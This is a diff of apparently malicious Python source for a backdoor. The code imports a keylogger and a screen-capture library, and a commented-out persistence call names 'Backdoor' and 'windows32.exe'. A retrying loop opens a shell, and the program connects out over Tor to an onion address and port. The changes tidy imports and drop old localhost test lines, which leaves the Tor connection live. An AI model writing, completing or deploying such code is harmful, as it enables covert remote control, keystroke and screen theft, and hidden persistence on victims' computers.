@@ -20,7 +20,7 @@ import requests
 from mss import mss
 
 # Local application/library specific imports
-import keylogger
+from tools import keylogger
 # from mss import mss # mss v6.1.0
 # import requests # v2.28.0
 
@@ -299,19 +299,13 @@ def connection():
     while True:
         time.sleep(1)
         try:
-            # s.connect(('127.0.0.1', 5555))
-            # if platform == 'win32':       #TO BE DONE
-            #     persist('Backdoor', 'windows32.exe')
+            #persist('Backdoor', 'windows32.exe')
             shell()
             s.close()
             break
         except:
             connection()
   
-
-
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# connection()
 
 tor = Tor()
 ENCODING = 'utf-8'
@@ -320,6 +314,6 @@ print('onion: ' + onion + '\nport: ' + str(port))
 
 clientsock = ClientSocket(onion,port)
 s = clientsock.create_connection()
-#after sucessful connection:
+
 connection()
 
